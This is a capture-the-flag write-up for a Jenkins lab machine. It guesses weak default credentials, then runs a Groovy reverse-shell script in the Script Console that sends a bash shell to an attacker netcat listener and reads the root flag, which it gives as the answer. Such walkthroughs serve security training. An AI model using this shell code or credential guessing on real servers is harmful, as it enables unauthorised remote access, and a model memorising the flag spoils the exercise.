# Table of Contents

- [Research](#research)
- [Reproduce](#reproduce)
- [Flag](#flag)

# Research

TASK 1

What does the acronym CVE stand for?

Common Vulnerabilities and Exposures

TASK 2

What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?

Confidentiality, Integrity, Availability


TASK 3

What is the version of the service running on port 8080?

    ┌──(kali㉿kali)-[~]
    └─$ nmap 10.129.23.128 -p- 8080 -sV
    ...
    PORT     STATE SERVICE VERSION
    8080/tcp open  http    Jetty 9.4.39.v20210325


Jetty 9.4.39.v20210325

TASK 4

What version of Jenkins is running on the target?

Achieved by bruteforcing common weak username/password combinations:

    admin:password
    admin:admin
    root:root
    root:password
    admin:admin1
    admin:password1
    root:password1

root:password

<img width="1017" alt="image" src="https://user-images.githubusercontent.com/10171446/170849486-3e1f843d-66ec-45cb-8eae-b7c5b3834da2.png">

Jenkins 2.289.1

TASK 5

What type of script is accepted as input on the Jenkins Script Console?

Project **Groovy** Script

TASK 6

What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows?

    C:\Windows\System32\cmd.exe

cmd.exe
    

TASK 7

What is a different command than "ip a" we could use to display our network interfaces' information on Linux?

    $ ifconfig

TASK 8

What switch should we use with netcat for it to use UDP transport mode?

Outlines [here](https://www.digitalocean.com/community/tutorials/how-to-use-netcat-to-establish-and-test-tcp-and-udp-connections)

    $ netcat -u host port

-u

TASK 9

What is the term used to describe making a target host initiate a connection back to the attacker host?

    reverse shell

## Establishing Reverse Shell

Using Jenkins console to make a reverse shell via UDP to our Kali machine 

On kali `$ nc -lvnp 8000`:
Run the script in Jenkins Script Console (replacing host="" with the listening interface):

    String host="IP_Addr_TUN0";
    int port=8000;
    String cmd="/bin/bash";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

<img width="1020" alt="image" src="https://user-images.githubusercontent.com/10171446/170849862-b43b49b0-237d-4994-baae-6f2aaa717e3f.png">

Netcat listener

<img width="534" alt="image" src="https://user-images.githubusercontent.com/10171446/170849931-6ff6cb5b-6910-46b2-8191-8e8725f2732e.png">


# Reproduce

Netcat listener on Kali `nc -lvnp 8000`

Via Jenkins `http://10.129.23.128:8080/script` with username: `root` and password: `password`

    String host="IP_Addr_TUN0";
    int port=8000;
    String cmd="/bin/bash";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


Netcat listener 

    ┌──(kali㉿kali)-[~]
    └─$ nc -lvnp 8000
    listening on [any] 8000 ...
    connect to [10.10.14.52] from (UNKNOWN) [10.129.23.128] 58002
    cat /root/flag.txt
    9cdfb439c7876e703e307864c9167a15

# Flag

9cdfb439c7876e703e307864c9167a15
